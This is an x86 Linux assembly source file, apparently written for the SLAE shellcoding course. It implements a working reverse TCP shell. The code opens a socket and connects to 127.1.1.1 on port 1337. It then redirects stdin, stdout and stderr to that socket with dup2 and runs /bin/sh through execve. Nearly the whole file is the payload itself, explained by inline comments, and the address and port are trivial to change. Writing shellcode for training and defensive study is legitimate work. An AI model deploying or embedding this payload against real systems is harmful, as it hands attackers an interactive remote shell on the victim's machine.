; Title		:
; Date		:
; Author	: Pedro Cabral
; Blog Post	:
; Twitter	: https://twitter.com/CabrallPedro
; LinkedIn	: https://www.linkedin.com/in/pedro-cabral1992
; SLAE ID	: SLAE-1372
; Tested on	: i686 GNU/Linux

global _start

_start:

; create Socket

xor eax, eax		; reseting the register
mov al, 0x66		; syscall 102 (socketcall)
xor ebx, ebx		; reseting the register
push ebx		; ebx=0
inc ebx			; ebx=1
push ebx		; 1  (SOCK_STREAM)
push 0x2		; 2 (AF_INET)
mov ecx, esp		; ecx = args array struct for the syscall
int 0x80		; syscall

; Connect Socket
xchg edi, eax		; save the file descriptor for future use
push dword 0x0101017f	; ip   = 127.1.1.1
push word 0x3905	; port = 1337
inc ebx			; ebx = 2
push bx			; 2 (AF_INET)

mov ecx, esp		; ecx = args array struct

push byte 0x10		; addrlen
push ecx		; sockaddr
push edi		; fd
mov ecx, esp		; ecx = args array struct for the syscall

inc ebx 		; ebx = 3
mov al, 0x66		; syscall 102 (socketcall)
int 0x80

;Redirect stdin, stdout and stderr

xchg ebx, edi		; save the file descriptor for future use
xor ecx, ecx		; reseting the register
mov cl, 0x2		; counter

loop:
mov al, 0x3f		; syscall 63 (dup2)
int 0x80		; syscall
dec ecx			; decrement counter
jns loop

;execve /bin/sh

xor eax, eax		; reseting the register
push eax		; string terminator

push 0x68732f6e ; hs/n	; hs/n
push 0x69622f2f ; ib//	; ib//

mov ebx, esp		; ebx = //bin/sh
push eax		
push ebx

mov ecx,esp		; argv = [filename,0]
mov edx, eax		; envp = 0

mov al, 0xb		; syscall 12 (execve)
int 0x80		; syscall
